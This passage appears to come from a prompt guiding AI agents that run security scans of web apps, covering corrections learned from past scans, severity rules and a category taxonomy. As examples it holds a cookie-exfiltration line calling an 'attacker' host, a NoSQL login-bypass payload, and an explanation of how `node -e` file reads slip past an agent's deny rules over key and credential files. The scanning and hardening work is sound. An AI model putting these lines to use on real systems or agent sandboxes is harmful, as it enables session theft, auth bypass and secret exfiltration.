31 migrations, so existing objects cannot be overwritten or removed"* — and used that to
lower a finding from destructive to creation-only. A live `pg_policy` query returned a
permissive `DELETE` policy present in **no migration**: any authenticated user could delete
any other organization's files. The absence was inferred from migration files; the database
had been changed through the Supabase dashboard, as most of these schemas were.

- A finding's severity may **never** rest on a DB-side control *not existing* — policies,
  grants, triggers, RLS, indexes — unless confirmed against the live catalog
  (`pg_policy`, `pg_class.relrowsecurity`, `information_schema`).
- Without a live probe, "no policy found in migrations" is **UNKNOWN**, never **ABSENT**.
  Unknown takes the higher severity.
- Absence claims about *source code* (no upload path, no `next/image` call, no API route)
  are fine — the repo is the whole truth there. The rule is specifically about state that
  lives in a running system.

### I2. Accepted Risks must survive regeneration — they are decisions, not output

`### Accepted Risks` and `### Resolved` sit INSIDE the `SCAN:AUTO` block in 26 of 29
projects, so every scan rewrites them. Their survival depends on an agent remembering an
instruction. **212 recorded accept/resolve decisions are one forgetful regeneration from
vanishing**, and one of them is a scope note (`this acceptance does NOT cover xlsx`) that is
the only thing keeping a reachable P1 from being absorbed into a blanket acceptance.

- Before rewriting the block, **parse the existing Accepted Risks and Resolved tables and
  reproduce every row verbatim**, including dates, scope notes and exclusions. Never
  paraphrase, never merge two entries, never drop a scope qualifier.
- If a prior accepted row names an EXCLUSION (`scoped to X only`, `does not cover Y`), that
  exclusion is load-bearing. Carry the exact words.
- **Cross-check before emitting Active Flags:** if a category appears in Accepted Risks, it
  may not also be emitted as active. One project shipped a CLAUDE.md listing
  `auth-weak-password-policy` under Active Flags with "Fix: raise the minimum to 12" while
  Accepted Risks recorded the owner's decision to keep it at 6 — exactly how an accepted
  decision gets quietly "fixed" later.
- If a count in prose disagrees with the table beneath it, the **table** is authoritative.

### I3. Do not damage the repo you are scanning

The scan's own commits broke a live revenue-taking app's production deploys **twice**,
leaving it unable to deploy for ~5.5 days while serving a stale build. Cause: the scan writes
unpadded markdown tables into `CLAUDE.md`, and that repo's `prebuild` runs
`prettier --check .` over markdown.

- **Before committing any file you wrote, run the repo's own gate.** Detect
  `prebuild` / `format:check` / `lint` in `package.json` and run it. If it fails because of
  your file, fix your file (`prettier --write <file>`) and re-run. If it still fails, do not
  commit.
- **`[skip ci]` does not prevent a Vercel deploy.** It suppressed the notification while the
  build failed anyway — hiding the breakage without preventing it. Never rely on it to mean
  "no deploy." If a scan commit triggers a deploy, check the deploy result and report it.
- **Keep table cells to a one-line summary.** Multi-thousand-character reachability prose in
  a single markdown cell makes a formatting-only re-pad produce an enormous diff, which is
  what turned a whitespace change into a production outage. Put the analysis in a prose
  subsection below the table, keyed by flag id.
- **Retire what you replace.** Do not append a second security section beside a stale one —
  two contradicting sources of truth in the file the freshness checker maintains.

### I4. Count root advisories, not affected packages; verify a fix exists

`npm audit` reports one advisory once per affected package. A scan reported "12 HIGH" where
`npm audit --omit=dev` returned **3**, and another reported 16 highs that all traced to a
**single** advisory cascading through minimatch consumers.

- Report **root advisory count** and say so. Package count is not advisory count.
- **`fixAvailable: true` is a claim, not a fact.** Verify a patched release exists AND is
  API-compatible before calling a fix actionable. `brace-expansion`'s only patched releases
  changed the module's export shape and break `minimatch@3`; `npm audit fix` on one project
  took it from 6 high to **20** high while fixing nothing.
- Resolve version claims against the **installed tree** (`npm ls <pkg>`, nested included),
  not the top-level range. `next@16.2.12` still nests its own vulnerable `sharp`/`postcss`.
- Where a framework vendors a vulnerable transitive and npm's only "fix" is a six-major
  downgrade, say **no forward fix exists** rather than recommending a bump that cannot work.

### I5. Judge a deny list by its EFFECTIVE strength

A scan called a 31-entry `permissions.deny` block "thorough" and named `Bash(curl:*)` as the
egress hole. The same settings allowed `Bash(node:*)`, `Bash(npx:*)` and `Bash(cat:*)` — each
arbitrary code execution or arbitrary file read — so all 19 path-based denies over `*.pem`,
`*.key`, `id_rsa*`, `.aws/**`, `.ssh/**` were void. `node -e "fs.readFileSync(...)"` walks
straight past them.

- **Enumerate allowed interpreters and read utilities FIRST** (`node`, `python`, `npx`,
  `deno`, `ruby`, `perl`, `powershell`, `sh`, `bash`, `cat`, `type`, `head`, `tail`).
- Any interpreter allow-rule **voids every path-based Bash deny**. Report effective strength,
  never the nominal entry count.
- MCP tool denies are different and DO hold — there is no alternate interpreter for an MCP
  tool call. Distinguish the two.

### I6. Strip comments before matching source patterns

Four independent owners reported the same false positive: `innerHTML` matched inside comments
that documented the code's avoidance of it — *"no innerHTML"*, *"not innerHTML"*, *"never
innerHTML/dangerouslySetInnerHTML"*. One dashboard rendered `xssVectors: 3` beside a scan that
had flagged zero XSS sinks and moved the related accepted risk to Resolved.

- Strip comment lines and string literals before counting `innerHTML` /
  `dangerouslySetInnerHTML` / `eval` / `document.write`, or require an assignment / call
  position. Report the count you can defend by reading the sink.
- This generalizes: **a regex that reads prose as structure is the single most common defect
  in this scan.** Other instances found the same week — flag-text line citations
  (`actions.ts:116,125`) parsed as a 116,125-line file; a merge step treating a flag whose
  text quotes `status: "fail"` as already-dispositioned, preserving it every run until 12
  phantom flags accumulated; standards assertions matching a function NAME rather than
  behavior. When a check greps, ask what prose could satisfy it.

### I7. Score a dimension N/A when the mechanism is absent

Three owners independently reported the cookie dimension as a false signal: their apps set no
cookies. Firebase Auth persists to IndexedDB, Supabase SPAs to localStorage. Scoring
`httpOnly ✗ / secure ✗` renders a permanent 1/3 on an app with no cookies to secure.

- **Detect the auth mechanism before scoring the cookie dimension.** Bearer/token auth with
  no app-set cookie → `N/A`, exactly as `sameSite` is already handled.
- `@supabase/ssr` ships `httpOnly: false` in its defaults *by design* because the browser
  client must read the session; closing it needs a server-side session exchange these apps
  do not have. Treat as a library default, not a per-app defect.
- **A CSP is NOT a compensating control for a JS-readable session cookie.** No shipped
  browser has a directive that stops top-level navigation (`navigate-to` never left draft),
  so `location = "https://attacker/?c=" + document.cookie` exfiltrates regardless of
  `connect-src` / `form-action`. The only genuine compensating control is zero XSS sinks.
- Same rule for CSP itself: **"present but permissive" is not "absent."** An app whose CSP
  carries `'unsafe-inline'` because its bundler requires it must not grade identically to an
  app serving no CSP at all.

### I8. Skipped is not passed

Two live public sites were recorded as `_Not deployed_` with STEP 1B skipped entirely, because
their URL was a platform default appearing nowhere in the repo. Both answered HTTP 200 when
probed. A check that silently did not run is indistinguishable, in the output, from a check
that passed.

- Follow the STEP 1B URL-extraction fallback before concluding "no URL."
- When a check genuinely cannot run, record it as a **deferral with a reason**, never as an
  absence and never as a strength. Headers *configured* in `next.config.ts` are not headers
  *served*; say which you verified.

### I9. Shared infrastructure is not a shared namespace

Two projects nearly lost data to the same class. Acting on `missing-audit-log`, the obvious
name `public.audit_log` **already existed with 76,076 rows belonging to a sibling app** in the
same Supabase project; `CREATE TABLE IF NOT EXISTS` silently skipped it. A `DROP TABLE IF
EXISTS` — an ordinary thing to write — would have destroyed another app's audit history.
Separately, a repo's Supabase CLI was linked to an old project still shared by four other
apps: a bare `supabase db push` would have deployed to the wrong database.

- Before recommending a new table / function / trigger, say: **check whether the object name
  is already taken in this project — a shared Postgres project is not a shared table.**
  Recommend a per-app prefix (`fb_*`, `wc_*`, `nfs_*`).
- Never recommend `DROP ... IF EXISTS` as migration boilerplate on a shared project.
- Check `supabase/config.toml` / `.supabase/` for the linked project ref and flag a mismatch
  against the project the app actually uses.
- When auth settings are project-level (signup policy, password minimum, HIBP), state the
  **blast radius in apps**, and verify how many schemas the project actually hosts rather
  than trusting the docs.

### I10. Enumerate every instance before reporting a pattern

A `static-admin-bearer` finding named one sender of a credential header. A repo-wide grep
found a second. Fixing only the named one would have left the credential on the wire and
silently broken the other path.

- When flagging a pattern (credential-as-bearer, unvalidated input, swallowed catch),
  enumerate **every** occurrence, not the first hit.
- **Headline the severe half.** One finding led with a timing-unsafe compare (low practical
  risk) while burying an unbounded caller-chosen storage key (write-anywhere if the secret
  leaks) in an escalation clause. Rank within a finding, not just across findings.
- **Label surface by runtime.** One flag merged a Vercel serverless route and a separate VPS
  service into "two endpoints"; they deploy and remediate independently.
- When an unvalidated value feeds a parser, check what **else** that same value decides
  downstream — one project's unverified `file.type` also chose the stored extension and
  `contentType`, persisting a mislabelled file.

### I11. Two new grep-able classes — check both every scan

**`auth-gate-fails-open-on-missing-config` (P1 when the file is the sole auth boundary).**
Found in two projects, both from the same "let it run before the keys exist" scaffolding:

```js
if (!url || !key) return NextResponse.next();   // Next middleware/proxy
if (!process.env.X) return next();              // Express
if (!config.auth) return true;                  // guard returning "allowed"
```

In any auth boundary (`middleware.ts`/`proxy.ts`, Express auth middleware, route guards),
find early returns conditioned on missing env/config that return a **pass** value. One
mistyped Vercel variable served an entire tool unauthenticated, silently, while working
locally. Fix guidance: fail closed in production, gate the escape hatch on `NODE_ENV`.
NOTE a verification helper returning `false` for "signature invalid" is fail-CLOSED and
correct — do not flag it.

**`auth-matcher-unanchored-exclusion` (P2; P1 if the matcher is the only auth boundary).**
Negative-lookahead matcher entries lacking `$` or a `/` boundary are PREFIX matches:
`favicon.ico` also excludes `/favicon.ico.bak`, and an unescaped dot makes `/faviconXico`
match too. Latent while those paths 404 — load-bearing the moment a route shares the prefix.

### I12. Other corrections owners asked to be carried forward

- **`VITE_*` / `NEXT_PUBLIC_*` exposure is decided by BUNDLING, not env-var presence.** A var
  set in the platform but referenced nowhere in source is never emitted into the bundle.
  Grep the built output or the source references before flagging.
- **React component inline styles are NOT a CSP dependency.** React sets styles through CSSOM
  (`node.style[k] = v`), which CSP does not police. `style-src` governs *parsed* `<style>`
  elements and HTML `style=""` attributes — i.e. HTML-string assembly reaching `innerHTML` /
  `document.write`. Do not recommend refactoring a 12,000-line component to drop
  `'unsafe-inline'`; the actual dependency is usually a few hundred lines in print/PDF builders.
  The CSP flag and any file-size flag are independent.
- **`formatting-inconsistency` on Windows: check whether the diff is line-endings-only.**
  `core.autocrlf=true` with no `.gitattributes` makes prettier flag files whose content is
  identical. One project carried this for 32 days while CI was green the entire time — and the
  scan asserted "CI fails its own gate today," which was false. Never assert CI status without
  checking it.
- **Grep `tests/` and `**/__tests__/` before calling anything dead.** A "delete this unused
  file" recommendation would have broken two Playwright specs that read it as a fixture. The
  correct fix was to MOVE it out of the web-served directory.
- **A plpgsql state write immediately followed by `raise exception` in the same function is
  dead code** — the raise rolls back the write. Confirmed present in two apps' live function
  bodies; the diagnostic fingerprint is a status that has never once been set.
- **Enumerate claude.ai cloud connectors alongside `~/.claude.json` `mcpServers`.** Two
  same-vendor MCP surfaces existed (`mcp__supabase__*` stdio and `mcp__claude_ai_Supabase__*`
  connector) exposing overlapping destructive tools; only one was scanned.
- **Baseline owner-authorized hooks by HASH, not existence** — so a modification is flagged
  rather than the file's presence. A `PreToolUse` hook returning a permission decision is
  exactly the file an attacker would want to edit.
- **A behavior documented as intentional can still be a vulnerability** when the reason it was
  intentional no longer holds. One fail-open auth gate was found by reading a CI comment that
  described it as deliberate — true for local dev, never true for production.

---

### I13. A stale or dirty clone SUPPRESSES deployed-state findings — it does not merely annotate them (v7.6)

**Comparing live production against stale local code is not a weak signal. It is not a signal.**

`repo-sync-skipped-dirty` (P4) already existed, and its own taxonomy row says the scan "read
possibly-stale local code." Nothing acted on it. STEP 1B went on comparing live headers against local
`vercel.json`. On a clone **17 commits behind origin**, that emitted `deployed-header-mismatch` **P2**
for a CSP the owner had fixed a month earlier — committed, deployed, and byte-identical in production.
The finding survived two scan cycles and was still being carried as live when the owner investigated.

Before STEP 1B, establish clone freshness:

```bash
git fetch origin 2>/dev/null
BEHIND=$(git rev-list --count HEAD..@{u} 2>/dev/null || echo unknown)
# Only the config files STEP 1B actually READS can corrupt the comparison.
DIRTY_CFG=$(git status --porcelain -- \
  vercel.json next.config.* middleware.* netlify.toml firebase.json _headers public/_headers \
  2>/dev/null | wc -l)
echo "behind:       $BEHIND"
echo "dirty config: $DIRTY_CFG"
echo "dirty total:  $(git status --porcelain | wc -l)   # context only — does NOT gate on its own"
```

Suppress when `BEHIND` is greater than 0 **or** `unknown` (no upstream configured — you cannot prove
freshness), **or** `DIRTY_CFG` is greater than 0. A dirty working tree that touches no STEP 1B config
file does **not** suppress the comparison.

- **Behind > 0, or unknown, or dirty in a file STEP 1B reads** (`vercel.json`, `next.config.*`,
  `middleware.*`, `netlify.toml`, `firebase.json`, `_headers`) → **DO NOT emit any
  source-vs-deployed comparison finding.** That includes `deployed-header-mismatch`, CSP drift, and
  any "configured in code but not served" claim. Emit `repo-sync-skipped-dirty` and state plainly in
  the deployed-surface section which comparisons were **suppressed and why**.
- Findings from the **live response alone** (a missing HSTS header, a wildcard `Access-Control-Allow-Origin`,
  a 200 on an exposed path) remain valid — they do not read local files, so staleness cannot corrupt them.
  Suppress the *comparison*, not the whole step.
- A suppressed comparison is **not** a pass (see I8) and **not** a resolution. Never move an existing
  mismatch flag to Resolved on a stale clone; leave it active and unverified.
- If the orchestrator can sync cleanly, **prefer syncing over suppressing.** Suppression is the
  fallback, not the goal.

Generalization: any check that compares **repo state to live state** inherits the repo's freshness.
Treat clone freshness as a precondition of that whole class, the same way I1 treats live-catalog
confirmation as a precondition for absence claims.

## FLAG OUTPUT RULES

Every flag MUST be a structured object:

{
  "text": "human-readable description",
  "severity": "P1|P2|P3|P4",
  "category": "category-key",
  "confidence": 0.95,
  "exploit": "Concrete attack scenario (required for P1/P2, omit for P3/P4)",
  "fix": "Specific remediation step (required for P1/P2, optional for P3/P4)"
}

- severity must be exactly one of: "P1", "P2", "P3", "P4"
- confidence must be a number from 0.7 to 1.0 — omit flags below 0.7
- exploit is required for P1 and P2 flags, omit for P3/P4
- fix is required for P1 and P2 flags, optional for P3/P4
- category must be a key from the CATEGORY TAXONOMY section below
- Deduplicate: if the same category would appear multiple times, merge into one flag with combined details in the text field
- Do NOT output plain string flags — always use the object format

---

## SECURITY FLAG RULES — check for ALL of the following and include any that apply:

P1 — Critical:
- API keys, tokens, client IDs, or secrets hardcoded in source code (not in .env) → category: hardcoded-secrets
- Supabase anon key or URL hardcoded in client-side code without Row Level Security → category: hardcoded-secrets
- No authentication on API routes that modify data → category: no-auth
- Sensitive data (passwords, tokens) stored in localStorage → category: localstorage-sensitive
- CORS set to allow all origins (Access-Control-Allow-Origin: *) → category: cors-open
- Firebase/Supabase security rules that are too permissive (e.g. allow all reads/writes) → category: permissive-rules
- Secrets found in git history (.env files, API keys, passwords committed in past commits even if later deleted) → category: secrets-in-git
- .env files tracked by git (not .env.example/.env.sample/.env.template) — these contain real secrets in the repo → category: env-tracked-by-git
- Known critical CVEs from npm audit → category: npm-cve-critical — **severity by REACHABILITY, see the rule below**
- Known high severity CVEs from npm audit → category: npm-cve-high — **severity by REACHABILITY, see the rule below**

**DEPENDENCY CVE SEVERITY — REACHABILITY TIERS (v7.5, BLOCKING).** Do NOT assign P1 to a
dependency CVE on advisory severity alone. `npm audit` reports the advisory's severity, which is a
property of the *library*, not of *this app's exposure*. Determine which tier applies and say which
one you applied, and why, in the flag text:

| Tier | Condition | Severity |
|---|---|---|
| **Reachable production** | In the production tree (`npm audit --omit=dev` still reports it) **AND** the vulnerable code path is actually reachable — the package is imported/executed by shipped code, or the advisory's preconditions match this app's configuration | **P1** |
| **Unreachable production** | In the production tree, but reachability is disproven by evidence — the module is never imported, the vulnerable API is never called, or the advisory's stated preconditions do not hold here | **P2** |
| **Dev/build only** | `npm audit --omit=dev` reports zero — the package never ships to the client bundle or the deployed runtime | **P3** |

Rules for applying this:
- **Cite the evidence.** "Dev-only" requires the actual `npm audit --omit=dev` result. "Unreachable"
  requires a named check — a grep of the build output, the absent import, or the unmet precondition.
  An unevidenced claim of unreachability is not a down-severity; when you cannot determine
  reachability, use the higher tier and say the trace was inconclusive.
- **Never write a P1 whose own flag text says the CVE cannot reach production.** That
  self-contradiction is the exact bug this rule exists to prevent.
- **Record the escalation tripwire** on any P2/P3 down-severity: state the change that would make it
  P1 (e.g. "escalates to P1 if `firebase/database` is ever imported"). A down-severity without a
  tripwire is a finding that silently stops being tracked.
- One flag per severity tier per project — group the advisories, do not emit one flag per CVE.
- This rule governs `npm-cve-critical` and `npm-cve-high` only. `npm-cve-moderate` stays P4.

**Why this rule exists (do not "simplify" it back).** Before v7.5 the taxonomy read
`npm-cve-high | P1` flatly, while actual portfolio practice — visible in the flag history — was
P3 for dev-only (8 instances), P2 for prod-but-unreachable (2), and P1 only for prod-and-reachable
(3). The written rule and the practice disagreed, so agents split: on the 2026-07-30 cycle, four
projects down-severitied on reachability while fourteen applied P1 mechanically, and one emitted a
`npm-cve-critical` **P1** whose own text read *"dev-only — never shipped."* The result was a
portfolio P1 count that rose ~9× from a rubric change rather than a posture change, which destroys
cycle-over-cycle comparability and buries the real findings. Severity must describe THIS app's
exposure, not the advisory's headline.
- Public repo with hardcoded secrets or credentials in source code → category: public-repo-secrets
- Admin credentials passed via query parameters → category: admin-creds-querystring
- SQL injection: raw SQL queries without parameterization (e.g. string concatenation in queries) → category: sql-injection
- XSS: dangerouslySetInnerHTML with unsanitized user input → category: xss-dangerously
- Auth cookies missing httpOnly flag (allows JS access to session tokens) → category: cookies-no-httponly
- NEXT_PUBLIC_ or VITE_ env vars exposing API secrets, service role keys, or admin credentials → category: env-exposure
- Error handlers that expose stack traces, file paths, or internal details in production responses → category: stack-trace-leakage
- Open redirect: user-controlled redirect URLs (e.g. ?redirect=, ?next=, ?returnTo=) without allowlist validation → category: open-redirect
- .env files found inside dist/, build/, .next/static/, or public/ directories → category: exposed-env-in-build
- RLS policies not yet implemented → category: no-rls
- File operations with user-controlled paths (../../etc/passwd) → category: path-traversal
- User input in template engine expressions → category: template-injection
- Unparameterized NoSQL queries with user input, OR request input (`req.body`/`req.query`) reaching a Mongo/Mongoose query as an object rather than a coerced string — enabling `$ne`/`$gt`/`$regex`/`$where` operator injection (classic auth bypass: `{username:{$ne:null},password:{$ne:null}}`) → category: nosql-injection
- JWT with weak/no signature verification or alg:none → category: jwt-vulnerability
- Untrusted data in JSON.parse callbacks, pickle, YAML.load → category: deserialization
- Client-side role checks (is_admin) without server-side enforcement → category: privilege-escalation
- Multi-tenant data queries scoped by a client-supplied tenant/org/user ID from request params instead of the authenticated session → category: tenant-id-from-request
- pull_request_target trigger with checkout of PR code in GitHub Actions → category: cicd-pull-request-target
- Script injection via github.event.* interpolation in CI run: steps → category: cicd-script-injection
- User input flowing into LLM system prompts or tool schemas → category: llm-prompt-injection
- eval() or exec() processing LLM/AI responses → category: llm-code-execution

P2 — High:
- PIN gates, name pickers, or other non-credential authentication → category: weak-auth
- NEXT_PUBLIC_ or VITE_ env vars that could expose sensitive configuration → category: env-exposure
- Auth middleware not applied consistently across API routes → category: route-protection-gap
- innerHTML usage without sanitization (potential XSS) → category: xss-innerhtml
- eval() or new Function() usage with dynamic input → category: xss-eval
- Session not invalidated/regenerated on auth state change → category: session-fixation
- Auth tokens stored in localStorage instead of httpOnly cookies → category: token-exposure
- Webhook endpoints without signature verification → category: webhook-no-signature
- API error responses that forward internal details (error.message, error.stack, error.code, error.hint, SQL text) to the client → category: error-response-leakage
- TLS verification disabled in production code → category: tls-verification-disabled
- LLM output rendered as HTML without sanitization → category: llm-output-unsanitized
- No validation on LLM tool/function calls before execution → category: llm-tool-no-validation
- Auth provider password policy allows weak passwords: min length < 12, no complexity requirements, or HIBP breach check disabled → category: auth-weak-password-policy
- Auth provider CAPTCHA configured but disabled on sign-up (bot abuse vector) → category: auth-no-captcha
- Auth provider enumeration protection disabled — different error responses for valid vs invalid emails/usernames allow account discovery → category: auth-enumeration-enabled
- Health/status API endpoint accessible without auth, exposing database type, connection status, latency, or version info → category: info-leak-health-endpoint
- Deployed headers mismatch: security headers configured in source code (next.config.js, vercel.json, middleware) but not served in production responses → category: deployed-header-mismatch

P3 — Medium:
- `req.query.X` consumed as a string with no array guard, on a parser that turns repeated params into an array (`?a=1&a=2` → `["1","2"]`) — `(req.query.x || "").toUpperCase()` then throws → category: query-param-array-crash. **Verified in production:** returned HTTP 500 `FUNCTION_INVOCATION_FAILED`, and a 500 is not cached, so it re-invoked the function on every request. Escalate to **P2** when the crashing route performs upstream work or is publicly reachable. **Scope this rule to array-returning parsers only** — Next.js Pages-router `req.query`, Express with `qs`, and equivalents. **Do NOT flag `URLSearchParams.get()`**: it returns `string | null` and never an array on repeated params (`getAll()` is the array form), so including it produces pure false positives. (v7.6)
- CDN-cached serverless route (sets `s-maxage` / `Cache-Control: public`) that does not validate its query string → category: unvalidated-query-cache-fork. The edge cache is keyed on the FULL URL, so `?cb=1`, `?cb=2`, … each mint a new cache entry, bypass the cache entirely, and re-invoke the function. Measured: identical URLs returned `X-Vercel-Cache: HIT`, any added param `MISS` every time — at 5 paid upstream API calls per miss on one route and a third-party HTML scrape on another. **An origin allowlist does not mitigate this** (`Origin` is a request header any non-browser client sets), and neither does an in-memory rate limiter (see `serverless-memory-state`). Escalate to **P2** when a miss costs paid quota or hits a third party from your domain. (v7.6)
- No rate limiting on public API routes → category: no-rate-limiting
- In-memory rate limiters, caches, or session stores (Map, Set, module-level variables) on serverless platforms (Vercel, Netlify, AWS Lambda, Cloud Functions) that reset on every cold start → category: serverless-memory-state
- catch/except blocks that neither log, rethrow, nor surface the error (empty catch, `except: pass`) → category: swallowed-exception (escalate to P2 when wrapping auth, payment, webhook, or data-write paths)
- Module-level collections written from request handlers with no eviction path (delete/clear/TTL/LRU/max-size) → category: unbounded-growth (escalate to P2 when keyed by unbounded user input on a long-running server)
- API routes with inconsistent auth/error handling patterns (some apply auth middleware, others skip it; some sanitize errors, others leak internals) → category: route-pattern-inconsistency
- No input validation on API routes that accept user data (use Zod, Yup, or similar) → category: no-input-validation
- Source maps (.map files) exposed or included in production build → category: source-maps-exposed
- Missing Content-Security-Policy header → category: missing-csp
- Missing Strict-Transport-Security (HSTS) header → category: missing-hsts
- Auth cookies missing secure flag (sent over HTTP) → category: cookies-no-secure
- Auth cookies missing sameSite attribute (CSRF risk) → category: cookies-no-samesite
- Missing CSRF token validation on state-changing forms/routes → category: csrf-missing
- File uploads without type or size validation → category: file-upload-no-validation
- document.write() usage → category: xss-document-write
- Deprecated or unmaintained packages with no maintained alternative → category: deprecated-packages
- Weak URL validation that could enable SSRF → category: ssrf-risk
- CDN scripts loaded without SRI integrity hashes → category: cdn-no-sri
- CDN dependencies loaded with @latest (unpinned) → category: unpinned-cdn
- DEPLOYED Node.js runtime is EOL or 2+ major versions behind current LTS — sourced from `functions/package.json` engines (Cloud Functions) or root `package.json` engines. **NEVER sourced from `.nvmrc`** (local toolchain only); a current `.nvmrc` must never clear this flag → category: outdated-runtime
- `.nvmrc` and the deployed `engines.node` declare different Node majors (local toolchain drifted from the deploy target) → category: runtime-declaration-mismatch
- A portfolio standard reports `status: "partial"` from STEP 1D's script — non-P1 checks failing → category: standard-partial
- Debug headers or logging that exposes auth state in production → category: debug-logging
- Unpinned third-party actions in CI/CD workflows → category: cicd-unpinned-actions
- No CODEOWNERS protection on CI/CD workflow files → category: cicd-no-codeowners
- Secrets passed as env vars in CI/CD (could leak in logs) → category: cicd-secrets-leak
- No cost/rate limiting on LLM API calls → category: llm-unbounded-cost
- OAuth scopes broader than necessary → category: oauth-broad-scopes
- Production dependencies with preinstall/postinstall/install scripts (potential supply chain attack vector) → category: supply-chain-install-scripts
- Auth provider MFA available but not enforced on an app handling sensitive data (financial, PII, equipment records) → category: auth-mfa-not-enforced
- Auth provider account lockout threshold too generous (> 20 attempts) or lockout duration too short (< 15 minutes) → category: auth-generous-lockout
- Sentry DSN or error tracking client key visible in page source or network requests — enables event flooding and quota abuse → category: info-leak-sentry-dsn
- Auth provider configuration publicly readable via unauthenticated API (exposes password policy, lockout rules, enabled features) → category: info-leak-auth-config
- CORS Access-Control-Allow-Origin: * verified on deployed API routes (not just static assets) → category: cors-open-deployed

P4 — Low:
- Missing .env.example or .env.local.example file → category: missing-env-example
- Missing README or setup documentation → category: missing-readme
- Missing .gitignore patterns for .env files → category: missing-gitignore
- Files over **1500 lines** that should be split → category: file-over-500. Threshold is uniform across all file types (.js, .ts, .jsx, .tsx, .css, .html, .py, etc.) as of v6.8 — the prior 500-line cutoff was folklore from human-era code review, and AI-readable code can be denser without becoming unworkable. The category key stays `file-over-500` for backwards compatibility with scan history and dashboard fields. Use this as a "consider splitting" signal, not a mandatory refactor trigger — cohesion matters more than raw line count.
- Known vulnerable or deprecated dependencies from npm audit (moderate severity) → category: npm-cve-moderate
- Missing X-Content-Type-Options header → category: missing-x-content-type
- Missing X-Frame-Options header (clickjacking risk) → category: missing-x-frame
- Missing Referrer-Policy header → category: missing-referrer-policy
- GPL or other copyleft licenses found in production dependencies → category: license-risk
- Firebase/public config in source (not a secret but not ideal) → category: hardcoded-config
- Console.log statements left in production code with sensitive data → category: debug-logging
- Prettier `--check` reports "Code style issues found in N files" in THIS scan run → category: formatting-inconsistency (confidence 1.0; flag text must reference the exact N from Prettier's output). If Prettier passes or no config exists, do NOT emit this flag.
- Missing /.well-known/security.txt — no vulnerability disclosure contact for security researchers → category: no-security-contact
- Missing or misconfigured robots.txt — returns HTML instead of proper robots directives → category: missing-robots-txt

---

## CATEGORY TAXONOMY

These are the valid category keys for flags. Every flag must use one of these:

| Category Key | Default Severity | Description |
|---|---|---|
| hardcoded-secrets | P1 | API keys, tokens, passwords in source code |
| hardcoded-config | P4 | Firebase/public config in source (not a secret but not ideal) |
| secrets-in-git | P1 | Secrets committed in git history |
| no-auth | P1 | Missing authentication on routes/endpoints |
| weak-auth | P2 | PIN gates, name pickers, no real credential verification |
| permissive-rules | P1 | Firestore/Supabase rules too open |
| no-rls | P1 | RLS not implemented |
| localstorage-sensitive | P1 | Passwords, tokens, financial data in localStorage |
| cors-open | P1 | CORS allows all origins |
| no-rate-limiting | P3 | No rate limiting on public API routes |
| no-input-validation | P3 | No validation on user-submitted data |
| source-maps-exposed | P3 | .map files in production build |
| npm-cve-critical | P1/P2/P3 | Critical CVE from npm audit — severity by REACHABILITY, see below |
| npm-cve-high | P1/P2/P3 | High CVE from npm audit — severity by REACHABILITY, see below |
| npm-cve-moderate | P4 | Moderate CVE from npm audit |
| auth-gate-fails-open-on-missing-config | P1/P2 | Auth boundary returns a PASS value when its own env/config is missing (`if (!url||!key) return next()`); P1 when that file is the sole auth gate. Fail closed in production. (v7.5) |
| auth-matcher-unanchored-exclusion | P2/P1 | Middleware/proxy matcher negative-lookahead entry lacking `$` or a `/` boundary, so it prefix-matches (`favicon.ico` also excludes `/favicon.ico.bak`); P1 if the matcher is the only auth boundary. (v7.5) |
| repo-sync-skipped-dirty | P4 | The scan read possibly-stale local code. Emit when the clone is **behind origin**, its upstream is **unknown**, **or** a STEP 1B config file is dirty — not only the original orchestrator-injected dirty case. **v7.6: this key now SUPPRESSES source-vs-deployed comparisons (I13), it does not merely annotate them.** Flag text must state which condition fired and which comparisons were suppressed |
| orphaned-platform-credential | P2 | Env var present on the deploy platform but referenced nowhere in source — a live credential with no consumer. Remediation is delete AND rotate; an unused key is still a valid key (v7.6) |
| retired-backend-endpoint-live | P1/P2 | A backend the app migrated away from, **confirmed still answering by an HTTP probe**. P1 when it responds 200 unauthenticated; P2 when it responds 401/403 (deployed but gated). Never assign from git history alone — history proves the string existed, not that anything is deployed (I1) (v7.6) |
| retired-backend-endpoint-unverified | P3 | Retired-backend fingerprint found in git history, but no URL was recoverable or no probe was possible. A HANDOFF: name the endpoint shape and ask the owner to check the provider console. This scan cannot query Google Workspace / AWS / GCP consoles (v7.6) |
| query-param-array-crash | P3/P2 | `req.query.X` used as a string with no array guard; repeated params parse to an array and throw an unhandled 500. P2 when the route does upstream work or is publicly reachable (v7.6) |
| unvalidated-query-cache-fork | P3/P2 | CDN-cached serverless route that does not validate its query string, so unknown params fork the cache key and bypass `s-maxage`. P2 when a miss costs paid quota or hits a third party (v7.6) |
| xss-innerhtml | P2 | innerHTML with user input |
| xss-dangerously | P1 | dangerouslySetInnerHTML with user input |
| xss-eval | P2 | eval() or new Function() |
| xss-document-write | P3 | document.write() usage |
| sql-injection | P1 | Raw SQL without parameterization |
| csrf-missing | P3 | Missing CSRF protection |
| missing-csp | P3 | No Content-Security-Policy header |
| missing-hsts | P3 | No HSTS header |
| missing-x-frame | P4 | No X-Frame-Options |
| missing-x-content-type | P4 | No X-Content-Type-Options |
| missing-referrer-policy | P4 | No Referrer-Policy |
| cookies-no-httponly | P1 | Auth cookies missing httpOnly |
| cookies-no-secure | P3 | Auth cookies missing secure flag |
| cookies-no-samesite | P3 | Auth cookies missing sameSite |
| file-upload-no-validation | P3 | Uploads without type/size validation |
| env-exposure | P2 | NEXT_PUBLIC_/VITE_ vars exposing secrets |
| public-repo-secrets | P1 | Public repo with credentials in source |
| admin-creds-querystring | P1 | Admin credentials via query parameters |
| ssrf-risk | P3 | Weak URL validation enabling SSRF |
| deprecated-packages | P3 | Unmaintained dependencies |
| debug-logging | P3 | Console.log with sensitive data in production |
| missing-env-example | P4 | No .env.example file |
| missing-readme | P4 | No README or setup docs |
| missing-gitignore | P4 | Missing .gitignore patterns for .env |
| file-over-500 | P4 | Files that should be split. Threshold: 1500 lines, applied uniformly across all file types as of v6.8. Category key kept for backwards compatibility with scan history. |
| stack-trace-leakage | P1 | Error handlers expose internals in production |
| open-redirect | P1 | User-controlled redirect without validation |
| exposed-env-in-build | P1 | .env files bundled into dist/build output |
| outdated-runtime | P3 | DEPLOYED Node runtime (functions/package.json engines for Cloud Functions, else root package.json engines) is EOL or 2+ majors behind LTS. NEVER sourced from .nvmrc — that is the local toolchain and must never clear this flag. (v7.3) |
| runtime-declaration-mismatch | P4 | `.nvmrc` (local toolchain) and the deployed `engines.node` declare different Node majors — the toolchain and deploy target have drifted; docs derived from the wrong one will lie. (v7.3) |
